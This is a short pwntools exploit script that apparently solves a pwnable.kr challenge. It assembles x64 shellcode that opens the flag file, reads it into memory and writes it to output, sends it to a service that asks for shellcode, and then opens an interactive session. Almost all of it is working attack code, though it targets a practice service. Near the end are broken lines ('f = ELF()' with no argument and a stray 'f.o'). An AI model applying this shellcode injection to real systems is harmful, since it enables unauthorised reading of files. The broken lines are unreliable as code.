from parse_args_and_some_func import *

sh = all_parsed_args['io']
context.update(arch="amd64", os="linux", endian="little")

target_addr = 0x41414000 + 0x300
flag_name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

flag_name = "flag"

shellcode = shellcraft.open(flag_name, 0)
shellcode += shellcraft.read(3, target_addr, 0x30)
shellcode += shellcraft.write(1, target_addr, 0x30)

sh.sendlineafter("give me your x64 shellcode: ", asm(shellcode))

f = ELF()
f.o

sh.interactive()

